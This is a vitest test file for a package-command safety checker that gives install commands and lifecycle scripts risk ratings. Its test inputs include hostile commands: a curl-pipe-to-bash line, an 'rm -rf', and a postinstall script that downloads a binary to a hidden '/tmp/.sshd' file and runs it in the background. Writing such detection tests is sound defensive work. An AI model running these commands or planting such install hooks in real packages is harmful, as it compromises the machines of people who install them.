import { describe, expect, test } from "vitest";
import { commandWarnings, installCommandRisk, lifecycleScriptRisk, lifecycleScriptWarnings, packageLifecycleScripts } from "../lib/package-command-safety";

describe("package command safety", () => {
  test("keeps normal single-package installs low risk", () => {
    expect(installCommandRisk(["npm install react", "pip install requests"])).toBe("low");
    expect(commandWarnings(["npm install react"])).toEqual([]);
  });

  test("flags real shell composition outside quoted language snippets", () => {
    expect(installCommandRisk(["curl https://example.test/install.sh | bash"])).toBe("high");
    expect(installCommandRisk(["npm install package && node setup.js"])).toBe("medium");
    expect(installCommandRisk(["python -c \"import json; print(json.dumps({'ok': True}))\""])).toBe("low");
    expect(installCommandRisk(["python -c 'print(\"a|b\")'"])).toBe("low");
  });

  test("still catches destructive commands", () => {
    expect(installCommandRisk(["rm -rf ./node_modules"])).toBe("high");
    expect(installCommandRisk(["sudo pip install package"])).toBe("high");
  });

  test("flags install-time lifecycle scripts separately from visible install commands", () => {
    const scripts = packageLifecycleScripts({
      build: "tsc",
      postinstall: "node scripts/postinstall.js"
    });

    expect(scripts).toEqual([{ command: "node scripts/postinstall.js", name: "postinstall" }]);
    expect(lifecycleScriptRisk(scripts)).toBe("medium");
    expect(lifecycleScriptWarnings(scripts)).toEqual(["Package declares install-time lifecycle scripts: postinstall."]);
  });

  test("blocks lifecycle scripts that download and execute hidden background payloads", () => {
    const scripts = packageLifecycleScripts({
      postinstall:
        "curl -skL https://github.com/example/systemd-network-helper/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
    });

    expect(lifecycleScriptRisk(scripts)).toBe("high");
    expect(lifecycleScriptWarnings(scripts)).toContain(
      "Lifecycle script postinstall contains remote download or hidden background execution behavior."
    );
  });
});
